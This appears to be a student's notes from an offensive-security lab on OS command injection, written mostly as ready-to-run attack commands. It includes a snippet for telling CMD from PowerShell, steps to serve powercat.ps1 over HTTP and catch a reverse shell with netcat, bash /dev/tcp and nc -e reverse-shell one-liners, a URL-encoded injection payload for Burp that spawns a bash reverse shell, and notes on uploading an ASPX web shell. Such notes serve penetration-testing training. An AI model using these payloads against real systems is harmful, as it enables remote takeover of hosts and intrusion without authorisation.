Snippet to display if command is being executed by CMD or PWSH:
```
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```

Serve Powercat on HTTP server and catch reverse shell:
```
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
```
```
python3 -m http.server 80
```
```
nc -nvlp 4444
```

With our web server serving **powercat.ps1** and Netcat listener in place, we can now use **curl** in the first terminal to inject the following command. It consists of two parts delimited by a semicolon. The first part uses a PowerShell download cradle to load the Powercat function contained in the **powercat.ps1** script from our web server. The second command uses the _powercat_ function to create the reverse shell with the following parameters: **-c** to specify where to connect, **-p** for the port, and **-e** for executing a program.

# Exercises and Capstone:
bash -i >& /dev/tcp/192.168.181.16/4444 0>&1
nc -e /bin/nc 192.168.45.228 4444
## Capstone 3
- The third field is vulnerable
- In burp substitute the third parameter with below:
	```
	test%22%26%26bash+-c+'bash+-i+>%26+/dev/tcp/192.168.45.249/443+0>%261'%22
	```

## Capstone 4
- uploaded /usr/share/webshells/aspx/cmdasp.aspx on port 8000
- interacted with shell over port 80
- Executed PS encoded reverse shell
- NOTE: and uploaded file might need to be interected with on a different port than it was uploaded on
